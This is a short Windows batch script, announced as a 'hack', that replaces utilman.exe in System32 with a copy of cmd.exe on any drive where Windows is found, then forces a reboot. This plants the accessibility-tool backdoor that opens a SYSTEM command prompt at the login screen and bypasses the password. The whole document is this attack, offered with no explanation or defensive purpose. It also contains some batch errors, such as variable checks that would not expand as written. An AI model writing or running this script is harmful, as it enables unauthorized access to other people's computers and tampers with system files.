@echo off

echo Hack started

for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W Y Z) do (
    if exist "%%d:\Windows\System32" (
        echo Found "%%d:\Windows\System32"
        
        set /p yesno=Do you want to edit this file [Y/N]?
        @REM echo %yesno%
        if /i "%yesno%"=="y" (
            echo Rename utilman.exe to utilman_old.exe
            if exist "%%d:\windows\system32\utilman_old.exe" (
                del -f "%%d:\windows\system32\utilman_old.exe"
            )
            ren "%%d:\windows\system32\utilman.exe" "%%d:\windows\system32\utilman_old.exe"
            
            echo Copy cmd.exe to utilman.exe
            copy /Y "%%d:\windows\system32\cmd.exe" "%%d:\windows\system32\utilman.exe"
            
            set /p continue=Hack finished. Press ENTER to continue...
            if /i "%continue%"=="" (
                start %%d:\windows\system32\shutdown.exe -f -r -t 00
            )
        )
    )
)

